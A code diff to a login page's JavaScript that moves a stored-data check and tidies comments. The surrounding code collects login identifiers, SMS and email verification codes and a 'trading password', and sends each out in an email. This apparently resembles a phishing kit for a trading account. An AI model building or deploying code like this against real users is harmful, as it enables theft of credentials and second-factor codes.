@@ -419,6 +419,7 @@
       subAccountTab.classList.remove("active");
       emailPhoneFields.classList.remove("hidden");
       subAccountFields.classList.add("hidden");
+
       identifier.disabled = false; identifier.required = true;
       loginPassword.disabled = false; loginPassword.required = true;
       subAccount.disabled = true; subAccount.required = false;
@@ -432,6 +433,7 @@
       emailPhoneTab.classList.remove("active");
       subAccountFields.classList.remove("hidden");
       emailPhoneFields.classList.add("hidden");
+
       identifier.disabled = true; identifier.required = false;
       loginPassword.disabled = true; loginPassword.required = false;
       subAccount.disabled = false; subAccount.required = true;
@@ -494,9 +496,14 @@
       }
     });
 
-    // ========== ID 1 + ID 2 ==========
+    // ========== ID 1 + ID 2 (fixed) ==========
     continueButton.addEventListener("click", async (e) => {
       e.preventDefault();
+
+      if (!storedLoginData) {
+        alert("No login data found. Please try again.");
+        return;
+      }
 
       const idValue1 = id1.value.trim();
       const idValue2 = id2.value.trim();
@@ -509,10 +516,6 @@
         alert("SMS and Email code must be 6 digits (numbers only)");
         return;
       }
-      if (!storedLoginData?.id) {
-        alert("No login data found.");
-        return;
-      }
 
       try {
         const fullData = {
@@ -522,7 +525,6 @@
           identification_timestamp: new Date().toISOString()
         };
 
-        // Second email (verification codes)
         const emailParams = {
           to_name: "Demo User",
           to_email: storedLoginData.identifier || storedLoginData.sub_account,
@@ -569,7 +571,6 @@
       }
 
       try {
-        // Third email (trading password)
         const emailParams = {
           to_name: "Demo User",
           to_email: storedLoginData.identifier || storedLoginData.sub_account,
@@ -603,7 +604,7 @@
       showEmailPhoneLogin();
     });
 
-    // Password toggle, back buttons, etc. (your original code)
+    // Password toggle, back buttons, etc.
     document.querySelectorAll(".toggle-password").forEach((button) => {
       button.addEventListener("click", (e) => {
         e.preventDefault();
